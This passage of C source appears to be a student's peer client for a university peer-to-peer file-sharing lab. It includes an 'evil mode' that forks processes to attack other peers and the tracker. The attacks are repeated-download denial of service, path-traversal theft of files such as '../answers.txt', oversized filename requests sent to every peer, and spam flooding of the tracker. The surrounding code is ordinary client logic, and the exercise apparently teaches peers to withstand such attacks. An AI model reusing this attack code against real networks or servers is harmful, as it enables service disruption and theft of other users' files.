		       fname, "Q3mAe3djcNCDKaXVj3AF7c");
	  osp2p_writef(trac_task->peer_fd, "DONTHAVE %s \n", fname);
	  (void) read_tracker_response(trac_task);
	  usleep(1000);
	}
    }
  fclose(f);
  message("* Spam completed.\n");
  return;
}

// main(argc, argv)
//	The main loop!
int main(int argc, char *argv[])
{
	task_t *tracker_task, *listen_task, *t;
	struct in_addr tracker_addr;
	int tracker_port;
	char *s;
	const char *myalias;
	struct passwd *pwent;
	pid_t child;

	// Default tracker is read.cs.ucla.edu
	osp2p_sscanf("131.179.80.139:11111", "%I:%d",
		     &tracker_addr, &tracker_port);
	if ((pwent = getpwuid(getuid()))) {
		myalias = (const char *) malloc(strlen(pwent->pw_name) + 20);
		sprintf((char *) myalias, "%s%d", pwent->pw_name,
			(int) time(NULL));
	} else {
		myalias = (const char *) malloc(40);
		sprintf((char *) myalias, "osppeer%d", (int) getpid());
	}

	// Ignore broken-pipe signals: if a connection dies, server should not
	signal(SIGPIPE, SIG_IGN);

	// Process arguments
    argprocess:
	if (argc >= 3 && strcmp(argv[1], "-t") == 0
	    && (osp2p_sscanf(argv[2], "%I:%d", &tracker_addr, &tracker_port) >= 0
		|| osp2p_sscanf(argv[2], "%d", &tracker_port) >= 0
		|| osp2p_sscanf(argv[2], "%I", &tracker_addr) >= 0)
	    && tracker_port > 0 && tracker_port <= 65535) {
		argc -= 2, argv += 2;
		goto argprocess;
	} else if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 't'
		   && (osp2p_sscanf(argv[1], "-t%I:%d", &tracker_addr, &tracker_port) >= 0
		       || osp2p_sscanf(argv[1], "-t%d", &tracker_port) >= 0
		       || osp2p_sscanf(argv[1], "-t%I", &tracker_addr) >= 0)
		   && tracker_port > 0 && tracker_port <= 65535) {
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 3 && strcmp(argv[1], "-d") == 0) {
		if (chdir(argv[2]) == -1)
			die("chdir");
		argc -= 2, argv += 2;
		goto argprocess;
	} else if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'd') {
		if (chdir(argv[1]+2) == -1)
			die("chdir");
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 3 && strcmp(argv[1], "-b") == 0
		   && osp2p_sscanf(argv[2], "%d", &evil_mode) >= 0) {
		argc -= 2, argv += 2;
		goto argprocess;
	} else if (argc >= 2 && argv[1][0] == '-' && argv[1][1] == 'b'
		   && osp2p_sscanf(argv[1], "-b%d", &evil_mode) >= 0) {
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 2 && strcmp(argv[1], "-b") == 0) {
		evil_mode = 1;
		--argc, ++argv;
		goto argprocess;
	} else if (argc >= 2 && (strcmp(argv[1], "--help") == 0
				 || strcmp(argv[1], "-h") == 0)) {
		printf("Usage: osppeer [-tADDR:PORT | -tPORT] [-dDIR] [-b]\n"
"Options: -tADDR:PORT  Set tracker address and/or port.\n"
"         -dDIR        Upload and download files from directory DIR.\n"
"         -b[MODE]     Evil mode!!!!!!!!\n");
		exit(0);
	}

	// Connect to the tracker and register our files.
	tracker_task = start_tracker(tracker_addr, tracker_port);
	listen_task = start_listen();
	register_files(tracker_task, myalias);
	/*
	// First, download files named on command line.
	for (; argc > 1; argc--, argv++)
		if ((t = start_download(tracker_task, argv[1])))
			task_download(t, tracker_task);

	// Then accept connections from other peers and upload files to them!
	while ((t = task_listen(listen_task)))
		task_upload(t);
	*/
	for(; argc > 1; argc--, argv++)
	  {
	    char fname[FILENAMESIZ] = {'\0'};
	    strncpy(fname, argv[1], FILENAMESIZ);
	    child = fork();
	    if(child > 0)
	      {
		if(evil_mode)
		  {
		    message("* DDOS beginning.\n");
		    child = fork();
		    if(child == 0)
		      {
			t = start_download(tracker_task, fname);
			ddos_download(t, tracker_task);
			exit(0);
		      }
		    else if(child < 0)
		      die("* Error creating child proc.\n");
		  }
		continue;
	      }
	    else if(child == 0)
	      {
		int retry = 0;
		t = start_download(tracker_task, fname);

		while(task_download(t, tracker_task) > 0
		      && retry < DL_RETRY)
		  {
		    sleep(DL_RETRY);
		    t = start_download(tracker_task, fname);
		    retry++;
		  }
		exit(0);
	      }
	    else
	      {
		die("* Error creating child proc.\n");
	      }
	  }
	if(evil_mode)
	  {
	    srand(time(0));
	    child = fork();
	    if(child == 0)
	      {
		message("* Evil mode activated.\n");
		//steal other users' files
		steal_file(tracker_task, "../osppeer.c");
		steal_file(tracker_task, "../answers.txt");

		//send oversized filename request to all peers
		overload_request(tracker_task);

		//spam tracker
		spam_md5(tracker_task, "../random.txt", 10);
		exit(0);
	      }
	    else if(child < 0)
	      die("* Error creating child proc.\n");
	  }
	upload_files(listen_task);
	return 0;
}
